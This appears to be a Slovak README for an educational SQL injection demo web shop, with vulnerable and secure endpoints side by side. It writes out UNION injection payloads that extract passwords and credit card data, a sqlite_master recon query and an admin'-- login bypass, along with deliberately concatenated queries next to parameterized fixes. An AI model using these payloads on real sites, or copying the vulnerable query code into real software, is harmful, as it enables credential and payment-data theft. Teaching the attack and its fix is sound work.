# BabyShop - SQL Injection Demo

Webová aplikácia demonštrujúca SQL Injection útok.  
Jedna aplikácia, dve verzie dostupné cez rôzne URL.

## Spustenie

```bash
pip install -r requirements.txt
uvicorn main:app --reload
```

Otvor: http://localhost:8000

## URL adresy

| Stránka | Vulnerable | Secure |
|---|---|---|
| Vyhľadávanie | `/vulnerable/search` | `/secure/search` |
| Login | `/vulnerable/login` | `/secure/login` |

---

## Útok 1 – UNION Injection (krádež hesiel)

**Kde:** http://localhost:8000/vulnerable/search

**Čo zadáš do vyhľadávacieho poľa:**
```
' UNION SELECT id, username, password, role FROM users--
```

**Čo sa stane:**  
Aplikácia vráti okrem kočíkov aj všetkých používateľov s heslami z tabuľky `users`.

**Prečo to funguje – SQL dotaz ktorý sa vykoná:**
```sql
SELECT * FROM prod WHERE name LIKE '%' UNION SELECT id, username, password, role FROM users--%'
```
Apostrof `'` uzavrie reťazec, `UNION` pridá druhý dotaz, `--` zakomentuje zvyšok.

**Na secure verzii** (`/secure/search`) ten istý vstup nájde 0 výsledkov – apostrof je len bežný znak.

---

## Útok 2 – UNION Injection (krádež údajov zákazníkov)

**Kde:** http://localhost:8000/vulnerable/search

**Čo zadáš do vyhľadávacieho poľa:**
```
' UNION SELECT id, f_name, credit_card, email FROM customers--
```

**Čo sa stane:**
Aplikácia vráti mená zákazníkov, čísla kreditných kariet a emaily priamo na stránke.

**Prečo to funguje – SQL dotaz ktorý sa vykoná:**
```sql
SELECT * FROM prod WHERE name LIKE '%' UNION SELECT id, f_name, credit_card, email FROM customers--%'
```

**Na secure verzii** (`/secure/search`) ten istý vstup nájde 0 výsledkov.

---

## Recon krok – zistenie struktury DB

Utocnik zvycajne nepozna nazvy tabuliek ani stlpcov. Zisti ich cez SQLite systemovu tabulku `sqlite_master`:

**Krok 1 – zoznam tabuliek a ich stlpcov:**
```
' UNION SELECT name, sql, 1, 1 FROM sqlite_master WHERE type='table'--
```

Vysledok vrati pre kazdu tabulku jej `CREATE TABLE` statement – teda presne nazvy stlpcov.
Napr. pre `users` vidi: `id, username, password, role`
Pre `customers` vidi: `id, f_name, last_name, email, phone, address, credit_card, date_of_birth`

**Krok 2 – az potom zadá cieleny UNION:**
```
' UNION SELECT id, username, password, role FROM users--
```
' UNION SELECT id, f_name, credit_card, phone FROM customers--
CREATE TABLE customers ( id INTEGER PRIMARY KEY AUTOINCREMENT, f_name TEXT NOT NULL, last_name TEXT NOT NULL, email TEXT NOT NULL, phone TEXT, address TEXT, credit_card TEXT, date_of_birth TEXT )

---

## Útok 3 – Login Bypass

**Kde:** http://localhost:8000/vulnerable/login

**Čo zadáš:**

| Pole | Hodnota |
|---|---|
| Meno | `admin'--` |
| Heslo | `cokokvek` |

**Čo sa stane:**  
Prihlásenie prebehne úspešne napriek zlému heslu.

**Prečo to funguje – SQL dotaz ktorý sa vykoná:**
```sql
SELECT * FROM users WHERE username = 'admin'--' AND password = 'cokokvek'
```
`--` zakomentuje podmienku s heslom → overuje sa len meno.

**Na secure verzii** (`/secure/login`) prihlásenie zlyhá – `admin'--` sa hľadá doslova ako meno.

---

## Rozdiel v kóde

### Vulnerable (zraniteľné)
```python
# Vyhladavanie
sql = "SELECT * FROM prod WHERE name LIKE '%" + q + "%'"

# Login
sql = f"SELECT * FROM users WHERE username = '{username}' AND password = '{password}'"
```

### Secure (zabezpecene)
```python
# Vyhladavanie
sql = "SELECT * FROM prod WHERE name LIKE ?"
rows = conn.execute(sql, (f"%{q}%",)).fetchall()

# Login
sql = "SELECT * FROM users WHERE username = ? AND password = ?"
user = conn.execute(sql, (username, password)).fetchone()
```

Rozdiel: `?` je placeholder – hodnota sa predáva oddelene a nikdy nevstúpi do SQL syntaxe.
